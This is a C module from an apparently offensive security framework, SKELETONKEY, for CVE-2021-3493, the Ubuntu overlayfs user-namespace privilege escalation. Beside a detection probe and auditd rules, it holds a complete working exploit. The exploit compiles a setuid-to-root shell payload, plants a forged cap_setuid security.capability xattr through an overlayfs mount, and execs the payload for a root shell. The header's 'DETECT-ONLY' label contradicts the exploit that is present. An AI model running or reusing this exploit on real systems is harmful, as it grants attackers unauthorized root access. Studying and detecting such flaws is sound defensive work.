/*
 * overlayfs_cve_2021_3493 — SKELETONKEY module
 *
 * Ubuntu-flavor overlayfs lets an unprivileged user mount overlayfs
 * inside a user namespace, then set file capabilities on a file in
 * the upper layer. The capabilities are NOT scoped to the userns —
 * they propagate to the host view of the same inode, letting an
 * unprivileged user create a file with CAP_SETUID/CAP_DAC_OVERRIDE
 * that root will honor outside the namespace.
 *
 * Discovered by Vasily Kulikov; published April 2021. Specific to
 * Ubuntu's modified overlayfs (vanilla upstream overlayfs didn't
 * allow the userns-mount path at the time). The fix landed via
 * Ubuntu's apparmor + an upstream Vfsmount audit.
 *
 * STATUS: 🔵 DETECT-ONLY. Exploit is well-documented (vsh's
 * exploit-cve-2021-3493) and would port in ~80 lines; follow-up
 * commit lands it.
 *
 * Affected:
 *   - Ubuntu 14.04 / 16.04 / 18.04 / 20.04 / 20.10 / 21.04 with
 *     Ubuntu-modified overlayfs and unprivileged_userns_clone=1.
 *   - Upstream kernels did NOT have the userns-mount path enabled
 *     pre-5.11, so non-Ubuntu kernels were largely immune by
 *     accident.
 *   - Fixed in Ubuntu by USN-4915-1 (April 2021) — kernel package
 *     updates per release.
 *
 * Detect logic (necessary-but-not-sufficient):
 *   1. /etc/os-release distro == ubuntu (the bug is Ubuntu-specific)
 *   2. Kernel version is below the Ubuntu fix threshold for that
 *      release. We don't track per-release Ubuntu kernel version
 *      maps in SKELETONKEY yet; report VULNERABLE if Ubuntu kernel
 *      AND uname() version < 5.11 AND unprivileged_userns_clone=1
 *      AND overlayfs mountable from userns (active probe).
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"
#include "../../core/host.h"
#include <fcntl.h>
#include <sched.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <errno.h>

static bool is_ubuntu(void)
{
    FILE *f = fopen("/etc/os-release", "r");
    if (!f) return false;
    char line[256];
    bool found = false;
    while (fgets(line, sizeof line, f)) {
        if (strstr(line, "ID=ubuntu") || strstr(line, "ID_LIKE=ubuntu")) {
            found = true;
            break;
        }
    }
    fclose(f);
    return found;
}

static int read_sysctl_int(const char *path)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    char buf[16] = {0};
    ssize_t n = read(fd, buf, sizeof buf - 1);
    close(fd);
    if (n <= 0) return -1;
    return atoi(buf);
}

/* Active probe: actually try to mount overlayfs inside a user
 * namespace. The probe is contained: forks a child that enters a
 * userns and attempts the mount; child exits regardless. Parent
 * never enters the namespace.
 *
 * Returns 1 if mount succeeded (vulnerable behavior), 0 if denied
 * (AppArmor / SELinux / kernel patch), -1 on probe machinery error. */
static int overlayfs_mount_probe(void)
{
    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) _exit(2);

        /* Build a minimal overlayfs in /tmp inside the child. */
        char base[] = "/tmp/skeletonkey-ovl-XXXXXX";
        if (!mkdtemp(base)) _exit(3);

        char low[512], up[512], wd[512], mp[512];
        snprintf(low, sizeof low, "%s/lower", base);
        snprintf(up,  sizeof up,  "%s/upper", base);
        snprintf(wd,  sizeof wd,  "%s/work",  base);
        snprintf(mp,  sizeof mp,  "%s/merged", base);
        if (mkdir(low, 0755) < 0 || mkdir(up, 0755) < 0
            || mkdir(wd, 0755) < 0 || mkdir(mp, 0755) < 0) _exit(4);

        char opts[2048];
        snprintf(opts, sizeof opts, "lowerdir=%s,upperdir=%s,workdir=%s",
                 low, up, wd);
        int rc = mount("overlay", mp, "overlay", 0, opts);
        if (rc < 0) _exit(5);   /* mount denied — likely patched/blocked */
        umount(mp);             /* clean up if we got here */
        _exit(0);
    }
    int status;
    waitpid(pid, &status, 0);
    if (!WIFEXITED(status)) return -1;
    return WEXITSTATUS(status) == 0 ? 1 : 0;
}

static skeletonkey_result_t overlayfs_detect(const struct skeletonkey_ctx *ctx)
{
    struct kernel_version v;
    if (!kernel_version_current(&v)) {
        fprintf(stderr, "[!] overlayfs: could not parse kernel version\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* Ubuntu-specific bug. Non-Ubuntu kernels are largely immune
     * because upstream didn't enable the userns-mount path until
     * 5.11. Bail early for non-Ubuntu. Consult the shared host
     * fingerprint (distro_id == "ubuntu" — populated once at startup;
     * the local is_ubuntu() helper is preserved for symmetry / future
     * standalone use but the dispatcher path goes through ctx->host). */
    bool ubuntu = ctx->host
        ? (strcmp(ctx->host->distro_id, "ubuntu") == 0)
        : is_ubuntu();
    if (!ubuntu) {
        if (!ctx->json) {
            fprintf(stderr, "[+] overlayfs: not Ubuntu (distro=%s) — bug is "
                "Ubuntu-specific\n",
                ctx->host ? ctx->host->distro_id : "?");
        }
        return SKELETONKEY_OK;
    }

    /* unprivileged_userns_clone gate */
    int uuc = read_sysctl_int("/proc/sys/kernel/unprivileged_userns_clone");
    if (uuc == 0) {
        if (!ctx->json) {
            fprintf(stderr, "[+] overlayfs: unprivileged_userns_clone=0 → "
                            "unprivileged exploit unreachable\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[i] overlayfs: Ubuntu kernel %s, unprivileged_userns_clone=%d\n",
                v.release, uuc);
    }

    /* Active probe: try the mount. Most reliable detect since Ubuntu
     * kernel package versioning is opaque to us. */
    if (ctx->active_probe) {
        int probe = overlayfs_mount_probe();
        if (probe == 1) {
            if (!ctx->json) {
                fprintf(stderr, "[!] overlayfs: ACTIVE PROBE CONFIRMED — "
                                "userns overlayfs mount succeeded → VULNERABLE\n");
            }
            return SKELETONKEY_VULNERABLE;
        }
        if (probe == 0) {
            if (!ctx->json) {
                fprintf(stderr, "[+] overlayfs: active probe denied mount — "
                                "likely patched / AppArmor block\n");
            }
            return SKELETONKEY_OK;
        }
        if (!ctx->json) {
            fprintf(stderr, "[?] overlayfs: active probe machinery failed\n");
        }
    }

    /* Without active probe, fall back to version inference. Upstream
     * 5.11 enabled userns-mount for overlayfs; Ubuntu had it earlier.
     * Ubuntu fix is per-release-specific; conservatively report
     * VULNERABLE if version < 5.13 (covers most affected Ubuntu LTS),
     * and recommend --active for confirmation. */
    if (!skeletonkey_host_kernel_at_least(ctx->host, 5, 13, 0)) {
        if (!ctx->json) {
            fprintf(stderr, "[!] overlayfs: Ubuntu kernel %s in vulnerable range — "
                            "re-run with --active to confirm\n", v.release);
        }
        return SKELETONKEY_VULNERABLE;
    }
    if (!ctx->json) {
        fprintf(stderr, "[+] overlayfs: Ubuntu kernel %s is newer than typical "
                        "affected range\n", v.release);
        fprintf(stderr, "[i] overlayfs: re-run with --active to empirically test\n");
    }
    return SKELETONKEY_OK;
}

/* ---- Exploit (vsh-style) ----------------------------------------
 *
 * The Ubuntu-overlayfs bug: file capabilities set inside a userns on
 * a file in the overlayfs UPPER layer are recorded as a regular
 * security.capability xattr on the host filesystem. Once outside the
 * namespace, the host kernel honors that xattr for any process that
 * execs the file — so we drop a payload with cap_setuid+ep in the
 * upper layer, leave the namespace, and exec from outside.
 *
 * Layout:
 *   workdir/
 *     payload.c     — source for the payload binary
 *     payload       — compiled binary (parent compiles)
 *     lower/        — overlayfs lower (empty)
 *     upper/        — overlayfs upper (where setcap'd file lives on host fs)
 *     work/         — overlayfs workdir
 *     merged/       — overlayfs merged view (child mounts here)
 *
 * Sequence:
 *   1. Parent: mkdtemp workdir; compile payload.c → payload
 *   2. Parent: fork → child
 *      Child:  unshare(NEWUSER|NEWNS); write uid_map/gid_map (root in userns)
 *      Child:  mount overlay merged/ with lower/upper/work
 *      Child:  cp payload → merged/payload  (writes to upper/payload on host)
 *      Child:  setcap cap_setuid,cap_setgid+ep on upper/payload via
 *              setxattr("security.capability", ...) — the bug lets this
 *              xattr stick on the host fs entry
 *      Child:  exit
 *   3. Parent: execve(upper/payload) — has cap_setuid effective → setuid(0)
 *              → execve("/bin/sh") with uid=0
 */

static const char OVERLAYFS_PAYLOAD_SOURCE[] =
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <unistd.h>\n"
    "int main(void) {\n"
    "    setuid(0); setgid(0);\n"
    "    setresuid(0,0,0); setresgid(0,0,0);\n"
    "    if (geteuid() != 0) { perror(\"setuid\"); return 1; }\n"
    "    char *new_env[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", NULL};\n"
    "    execle(\"/bin/sh\", \"sh\", \"-p\", NULL, new_env);\n"
    "    execle(\"/bin/bash\", \"bash\", \"-p\", NULL, new_env);\n"
    "    return 1;\n"
    "}\n";

/* libcap-less setcap: build the VFS_CAP_REVISION_2 binary blob and
 * write it via setxattr("security.capability"). cap_setuid = bit 7,
 * cap_setgid = bit 6. */
static int overlayfs_set_cap_setuid(const char *path)
{
    /* struct vfs_cap_data (revision 2):
     *   __le32 magic_etc           // revision in upper bits
     *   __le32 permitted[2]        // 64-bit cap mask split low/high
     *   __le32 inheritable[2]
     */
    unsigned char cap[20] = {0};
    /* magic_etc: VFS_CAP_REVISION_2 = 0x02000000 (no flags) */
    cap[0] = 0x00; cap[1] = 0x00; cap[2] = 0x00; cap[3] = 0x02;
    /* permitted[0] = (1 << CAP_SETUID) | (1 << CAP_SETGID)
     *              = (1 << 7) | (1 << 6) = 0xC0 */
    cap[4] = 0xC0; cap[5] = 0x00; cap[6] = 0x00; cap[7] = 0x00;
    /* effective bit (VFS_CAP_FLAGS_EFFECTIVE = 0x000001 OR'd into magic_etc) */
    cap[0] |= 0x01;
    return setxattr(path, "security.capability", cap, sizeof cap, 0);
}

static bool which_gcc(char *out_path, size_t outsz)
{
    static const char *candidates[] = {
        "/usr/bin/gcc", "/usr/bin/cc", "/bin/gcc", "/bin/cc",
        "/usr/local/bin/gcc", "/usr/local/bin/cc", NULL,
    };
    for (size_t i = 0; candidates[i]; i++) {
        if (access(candidates[i], X_OK) == 0) {
            strncpy(out_path, candidates[i], outsz - 1);
            out_path[outsz - 1] = 0;
            return true;
        }
    }
    return false;
}

static skeletonkey_result_t overlayfs_exploit(const struct skeletonkey_ctx *ctx)
{
    /* Re-confirm vulnerable. */
    skeletonkey_result_t pre = overlayfs_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] overlayfs: detect() says not vulnerable; refusing\n");
        return pre;
    }
    if (geteuid() == 0) {
        fprintf(stderr, "[i] overlayfs: already root — nothing to escalate\n");
        return SKELETONKEY_OK;
    }

    char workdir[] = "/tmp/skeletonkey-ovl-XXXXXX";
    if (!mkdtemp(workdir)) { perror("mkdtemp"); return SKELETONKEY_TEST_ERROR; }
    if (!ctx->json) fprintf(stderr, "[*] overlayfs: workdir = %s\n", workdir);

    char gcc[256];
    if (!which_gcc(gcc, sizeof gcc)) {
        fprintf(stderr, "[-] overlayfs: no gcc/cc — exploit needs to compile a payload\n");
        rmdir(workdir);
        return SKELETONKEY_PRECOND_FAIL;
    }

    char src_path[1100], bin_path[1100];
    snprintf(src_path, sizeof src_path, "%s/payload.c", workdir);
    snprintf(bin_path, sizeof bin_path, "%s/payload", workdir);

    int fd = open(src_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { perror("open payload.c"); rmdir(workdir); return SKELETONKEY_TEST_ERROR; }
    if (write(fd, OVERLAYFS_PAYLOAD_SOURCE, sizeof(OVERLAYFS_PAYLOAD_SOURCE) - 1)
            != (ssize_t)(sizeof(OVERLAYFS_PAYLOAD_SOURCE) - 1)) {
        close(fd); unlink(src_path); rmdir(workdir); return SKELETONKEY_TEST_ERROR;
    }
    close(fd);

    /* Compile payload */
    pid_t gc = fork();
    if (gc == 0) {
        execl(gcc, gcc, "-O2", "-static", "-o", bin_path, src_path, (char *)NULL);
        _exit(127);
    }
    int gc_status;
    waitpid(gc, &gc_status, 0);
    if (!WIFEXITED(gc_status) || WEXITSTATUS(gc_status) != 0) {
        /* try non-static fallback */
        gc = fork();
        if (gc == 0) {
            execl(gcc, gcc, "-O2", "-o", bin_path, src_path, (char *)NULL);
            _exit(127);
        }
        waitpid(gc, &gc_status, 0);
        if (!WIFEXITED(gc_status) || WEXITSTATUS(gc_status) != 0) {
            fprintf(stderr, "[-] overlayfs: gcc failed\n");
            goto fail_workdir;
        }
    }
    if (!ctx->json) fprintf(stderr, "[*] overlayfs: payload compiled\n");

    /* mkdir lower / upper / work / merged */
    char lower[1100], upper[1100], work[1100], merged[1100], upper_bin[2200];
    snprintf(lower,  sizeof lower,  "%s/lower",  workdir);
    snprintf(upper,  sizeof upper,  "%s/upper",  workdir);
    snprintf(work,   sizeof work,   "%s/work",   workdir);
    snprintf(merged, sizeof merged, "%s/merged", workdir);
    snprintf(upper_bin, sizeof upper_bin, "%s/payload", upper);
    if (mkdir(lower, 0755) < 0 || mkdir(upper, 0755) < 0
        || mkdir(work, 0755) < 0 || mkdir(merged, 0755) < 0) {
        perror("mkdir layout"); goto fail_workdir;
    }

    /* Fork child. Child enters userns + mountns and does the setcap. */
    uid_t outer_uid = getuid();
    gid_t outer_gid = getgid();
    char uid_map[64], gid_map[64];
    snprintf(uid_map, sizeof uid_map, "0 %u 1\n", outer_uid);
    snprintf(gid_map, sizeof gid_map, "0 %u 1\n", outer_gid);

    pid_t child = fork();
    if (child < 0) { perror("fork"); goto fail_workdir; }
    if (child == 0) {
        /* CHILD: enter userns + mountns, do the exploit setup */
        if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) { perror("unshare"); _exit(2); }
        /* Wait for parent to set our uid_map/gid_map */
        /* Actually we'll do it ourselves now since we already unshared */
        char self_uid_map[64], self_gid_map[64];
        snprintf(self_uid_map, sizeof self_uid_map, "/proc/self/uid_map");
        snprintf(self_gid_map, sizeof self_gid_map, "/proc/self/gid_map");
        int f = open("/proc/self/setgroups", O_WRONLY);
        if (f >= 0) { (void)!write(f, "deny\n", 5); close(f); }
        f = open(self_uid_map, O_WRONLY);
        if (f < 0 || write(f, uid_map, strlen(uid_map)) < 0) {
            perror("write uid_map"); _exit(3);
        }
        close(f);
        f = open(self_gid_map, O_WRONLY);
        if (f < 0 || write(f, gid_map, strlen(gid_map)) < 0) {
            perror("write gid_map"); _exit(4);
        }
        close(f);

        /* Now uid 0 inside userns. Mount overlayfs. */
        char opts[4096];
        snprintf(opts, sizeof opts, "lowerdir=%s,upperdir=%s,workdir=%s",
                 lower, upper, work);
        if (mount("overlay", merged, "overlay", 0, opts) < 0) {
            perror("mount overlay"); _exit(5);
        }

        /* Copy payload into merged dir (writes to upper on host fs) */
        char merged_bin[2200];
        snprintf(merged_bin, sizeof merged_bin, "%s/payload", merged);
        int in = open(bin_path, O_RDONLY);
        int out = open(merged_bin, O_WRONLY | O_CREAT | O_TRUNC, 0755);
        if (in < 0 || out < 0) { perror("open copy"); _exit(6); }
        char copybuf[4096];
        ssize_t n;
        while ((n = read(in, copybuf, sizeof copybuf)) > 0) {
            if (write(out, copybuf, n) != n) { perror("write copy"); _exit(7); }
        }
        close(in); close(out);

        /* setcap cap_setuid,cap_setgid+ep on the merged copy.
         * THE BUG: this xattr persists on the host's upper/ file. */
        if (overlayfs_set_cap_setuid(merged_bin) < 0) {
            perror("setxattr security.capability"); _exit(8);
        }
        _exit(0);
    }
    int cstatus;
    waitpid(child, &cstatus, 0);
    if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
        fprintf(stderr, "[-] overlayfs: child setup failed (status=%d)\n", cstatus);
        goto fail_workdir;
    }

    /* Verify the xattr stuck on the host fs entry */
    char check_xattr[20];
    ssize_t got = getxattr(upper_bin, "security.capability", check_xattr,
                           sizeof check_xattr);
    if (got <= 0) {
        fprintf(stderr, "[-] overlayfs: xattr did not persist on host upper "
                        "(getxattr returned %zd; errno=%d). Patched or AppArmor-blocked.\n",
                got, errno);
        goto fail_workdir;
    }

    if (!ctx->json) {
        fprintf(stderr, "[+] overlayfs: cap_setuid+ep xattr persisted on host fs "
                        "— execing payload to drop root\n");
    }
    if (ctx->no_shell) {
        fprintf(stderr, "[+] overlayfs: --no-shell — payload at %s, not exec'ing\n",
                upper_bin);
        return SKELETONKEY_EXPLOIT_OK;
    }
    fflush(NULL);
    execl(upper_bin, upper_bin, (char *)NULL);
    perror("execl payload");

fail_workdir:
    /* best-effort cleanup */
    unlink(src_path); unlink(bin_path); unlink(upper_bin);
    rmdir(merged); rmdir(work); rmdir(upper); rmdir(lower);
    rmdir(workdir);
    return SKELETONKEY_EXPLOIT_FAIL;
}

#else  /* !__linux__ */

/* Non-Linux dev builds: overlayfs / unshare(CLONE_NEWUSER|CLONE_NEWNS) /
 * setxattr("security.capability") are all Linux-only. Stub out so the
 * module still registers and the top-level `make` completes on
 * macOS/BSD dev boxes. */
static skeletonkey_result_t overlayfs_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] overlayfs: Linux-only module "
                "(Ubuntu userns-overlayfs) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t overlayfs_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] overlayfs: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}

#endif /* __linux__ */

/* ----- Embedded detection rules ----- */

static const char overlayfs_auditd[] =
    "# overlayfs userns LPE (CVE-2021-3493) — auditd detection rules\n"
    "# Flag userns-clone followed by overlayfs mount + setcap-like xattr.\n"
    "-a always,exit -F arch=b64 -S mount -F a2=overlay -k skeletonkey-overlayfs\n"
    "-a always,exit -F arch=b32 -S mount -F a2=overlay -k skeletonkey-overlayfs\n"
    "# Watch for security.capability xattr writes (the post-mount step)\n"
    "-a always,exit -F arch=b64 -S setxattr,fsetxattr,lsetxattr -k skeletonkey-overlayfs-cap\n";

const struct skeletonkey_module overlayfs_module = {
    .name           = "overlayfs",
    .cve            = "CVE-2021-3493",
    .summary        = "Ubuntu userns-overlayfs file-capability injection → host root",
    .family         = "overlayfs",
    .kernel_range   = "Ubuntu-specific; kernels w/ userns-overlayfs-mount before per-release fix (USN-4915-1)",
    .detect         = overlayfs_detect,
    .exploit        = overlayfs_exploit,
    .mitigate       = NULL,
    .cleanup        = NULL,    /* exploit cleans up its own workdir on failure;
                                * on success, exec replaces us so cleanup-by-us doesn't apply */
    .detect_auditd  = overlayfs_auditd,
    .detect_sigma   = NULL,
    .detect_yara    = NULL,
    .detect_falco   = NULL,
    .opsec_notes    = "unshare(CLONE_NEWUSER|CLONE_NEWNS) for CAP_SYS_ADMIN; mount('overlay', merged, ...); compile + copy payload into the merged dir (writes upper on host fs); setxattr(upper_payload, 'security.capability', cap_setuid+ep) - the bug is that this xattr persists on the HOST fs despite being set inside userns. Parent then execve's the now-CAP_SETUID payload, calls setuid(0), execs /bin/sh. Artifacts: /tmp/skeletonkey-ovl-XXXXXX/ workdir; cleaned on exit/failure (on success the exec replaces the process so cleanup does not run). Audit-visible via unshare + mount(overlay) + setxattr(security.capability) + execve of attacker-controlled binary. Dmesg silent.",
};

void skeletonkey_register_overlayfs(void)
{
    skeletonkey_register(&overlayfs_module);
}
